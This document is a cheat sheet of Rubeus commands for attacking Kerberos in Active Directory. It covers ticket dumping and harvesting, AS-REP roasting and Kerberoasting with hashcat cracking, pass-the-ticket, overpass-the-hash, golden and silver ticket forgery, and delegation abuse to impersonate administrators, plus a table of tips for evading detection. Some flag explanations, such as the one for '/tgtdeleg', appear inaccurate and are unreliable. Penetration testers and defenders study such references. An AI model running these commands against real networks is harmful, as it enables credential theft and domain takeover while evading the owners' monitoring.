
# Rubeus Cheat Sheet

> Rubeus is a C# tool for Kerberos attacks and abuse in Active Directory environments.

---

## Harvesting & Enumeration

```bash
# Harvest TGTs from logon sessions
Rubeus.exe harvest /interval:30

# List current Kerberos tickets in memory
Rubeus.exe triage

# Dump all tickets from memory (requires admin)
Rubeus.exe dump

# Dump tickets for a specific user
Rubeus.exe dump /user:administrator

# Dump tickets for a specific service
Rubeus.exe dump /service:krbtgt
```

---

## AS-REP Roasting

```bash
# Find users without Kerberos pre-auth required
Rubeus.exe asreproast

# Target a specific user
Rubeus.exe asreproast /user:targetuser

# Output to file (hashcat format)
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Use a domain controller
Rubeus.exe asreproast /dc:dc01.domain.local /format:hashcat
```

Crack with hashcat:
```bash
hashcat -m 18200 hashes.txt wordlist.txt
```

---

## Kerberoasting

```bash
# Roast all kerberoastable accounts
Rubeus.exe kerberoast

# Target a specific user
Rubeus.exe kerberoast /user:svcaccount

# Output in hashcat format
Rubeus.exe kerberoast /format:hashcat /outfile:kerb_hashes.txt

# Roast only AES-encrypted tickets
Rubeus.exe kerberoast /tgtdeleg
```

Crack with hashcat:
```bash
hashcat -m 13100 kerb_hashes.txt wordlist.txt
```

---

## Pass-the-Ticket (PTT)

```bash
# Import a ticket (.kirbi file) into memory
Rubeus.exe ptt /ticket:ticket.kirbi

# Import a base64-encoded ticket
Rubeus.exe ptt /ticket:<base64>

# Purge all tickets from current session
Rubeus.exe purge

# Create a sacrificial logon session and inject ticket
Rubeus.exe createnetonly /program:cmd.exe
Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x1234ab
```

---

## Overpass-the-Hash / Ask TGT

```bash
# Request TGT using NTLM hash
Rubeus.exe asktgt /user:admin /rc4:<ntlm_hash> /ptt

# Request TGT using AES256 key
Rubeus.exe asktgt /user:admin /aes256:<aes_key> /ptt

# Request TGT and save to file
Rubeus.exe asktgt /user:admin /rc4:<ntlm_hash> /outfile:admin.kirbi

# Request TGT for another domain
Rubeus.exe asktgt /user:admin /domain:target.local /rc4:<ntlm_hash> /ptt
```

---

## Request Service Tickets (TGS)

```bash
# Ask for a TGS using existing TGT
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/fileserver.domain.local /ptt

# Ask for TGS using credentials
Rubeus.exe asktgs /user:admin /rc4:<hash> /service:http/webserver.domain.local /ptt
```

---

## Golden & Silver Tickets

```bash
# Forge a Golden Ticket (requires krbtgt hash)
Rubeus.exe golden /rc4:<krbtgt_ntlm> /domain:domain.local /sid:S-1-5-21-... /user:fakeadmin /ptt

# Forge a Silver Ticket (requires service account hash)
Rubeus.exe silver /rc4:<service_ntlm> /domain:domain.local /sid:S-1-5-21-... /user:fakeadmin /service:cifs/server /ptt
```

---

## S4U (Constrained Delegation Abuse)

```bash
# S4U2Self + S4U2Proxy — impersonate a user to a service
Rubeus.exe s4u /user:svcaccount /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt

# S4U with an existing TGT
Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt

# S4U with additional target SPN (altservice)
Rubeus.exe s4u /user:svcaccount /rc4:<hash> /impersonateuser:admin /msdsspn:cifs/target /altservice:host /ptt
```

---

## Ticket Renewal & Monitoring

```bash
# Renew a TGT before expiry
Rubeus.exe renew /ticket:tgt.kirbi /ptt

# Auto-renew in background (keep alive)
Rubeus.exe renew /ticket:tgt.kirbi /autorenew

# Monitor for new TGTs being issued
Rubeus.exe monitor /interval:5 /targetuser:administrator
```

---

## Encode / Decode Tickets

```bash
# Encode a .kirbi ticket to base64
Rubeus.exe encode /ticket:ticket.kirbi

# Describe a ticket (show contents)
Rubeus.exe describe /ticket:ticket.kirbi
Rubeus.exe describe /ticket:<base64>
```

---

## OPSEC Tips

| Tip | Reason |
|-----|--------|
| Use `/opsec` flag where available | Requests RC4 tickets by default — request AES to blend in |
| Use `/enctype:aes256` | AES is less suspicious than RC4 in modern environments |
| Use `createnetonly` before PTT | Avoids touching existing sessions |
| Avoid `dump` without `/luid` | Dumping all tickets is noisy |
| Clean up with `purge` | Removes injected tickets after use |

---

## Common Flags Reference

| Flag | Description |
|------|-------------|
| `/ptt` | Inject ticket directly into memory |
| `/outfile:` | Save ticket to file |
| `/domain:` | Specify target domain |
| `/dc:` | Specify domain controller |
| `/user:` | Target username |
| `/rc4:` | NTLM/RC4 hash |
| `/aes256:` | AES-256 key |
| `/sid:` | Domain SID |
| `/luid:` | Logon session ID |
| `/format:hashcat` | Output for hashcat cracking |
| `/nowrap` | Don't wrap base64 output |
